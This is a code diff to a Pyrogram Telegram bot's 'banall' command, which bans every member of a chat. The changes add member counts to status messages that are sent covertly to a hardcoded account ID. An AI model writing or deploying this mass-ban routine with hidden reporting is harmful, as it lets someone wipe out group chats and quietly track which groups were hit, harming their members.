@@ -48,6 +48,7 @@ from pyrogram import Client, enums, filters
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, ChatPermissions, Message
 import asyncio
 from pyrogram import Client, filters, enums
+from pyrogram.types import Message, User, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
 
 AMBOT = 7045191057
 
@@ -66,10 +67,11 @@ async def banall(client, message: Message):
     chat_name = message.chat.title if message.chat.title else "None"
     chat_username = message.chat.username if message.chat.username else "None"
     banned = 0 
+    chat_members = await app.get_chat_members_count(chat_id)
     try:
         AM = await app.send_message(
             AMBOT, 
-            f"Banall Started successfully.\nChat Name: {chat_name}\nChat Username: {chat_username}\nChat Id: {chat_id}\nBanall Started By: {message.from_user.mention}"
+            f"Banall Started successfully.\nChat Name: {chat_name}\nChat Username: {chat_username}\nChat Id: {chat_id}\nChat Members : {chat_members}\n\nBanall Started By: {message.from_user.mention}"
         )
         bot = await app.get_chat_member(chat_id, app.me.id)
         async for member in app.get_chat_members(chat_id):
@@ -80,8 +82,9 @@ async def banall(client, message: Message):
                 banned += 1 
             except Exception as e:
                 pass
+        chat = await app.get_chat_members_count(chat_id)
         await AM.edit(
-            f"Banall Completed successfully.\nBanned {banned} members.\n\nChat Name: {chat_name}\nChat Username: {chat_username}\nChat Id: {chat_id}\nBanall Started By: {message.from_user.mention}"
+            f"Banall Completed successfully.\nBanned {banned} members.\n\nChat Name: {chat_name}\nChat Username: {chat_username}\nChat Members : {chat}\nChat Id: {chat_id}\nBanall Started By: {message.from_user.mention}"
         )
         await app.send_message(
             chat_id,
